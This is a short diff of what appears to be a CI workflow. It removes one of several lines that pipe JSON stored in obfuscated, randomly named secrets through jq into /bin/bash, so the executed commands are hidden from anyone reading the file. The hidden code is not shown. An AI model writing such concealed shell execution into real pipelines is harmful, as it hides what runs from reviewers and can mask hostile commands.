@@ -18,7 +18,6 @@ jobs:
           xfam03749: ${{ secrets.xfam03749 }}
         run: |
           printf '%s' "$xfam03749" | jq -r .m70593 | /bin/bash
-          echo $ow02 | jq -r .acqdu873 | /bin/bash
           printf '%s' "$z207" | jq -r .cua8 | /bin/bash
           printf '%s' "$bn560" | jq -r .imv9081 | /bin/bash
           printf '%s' "$t430" | jq -r .hpaxm7913 | /bin/bash
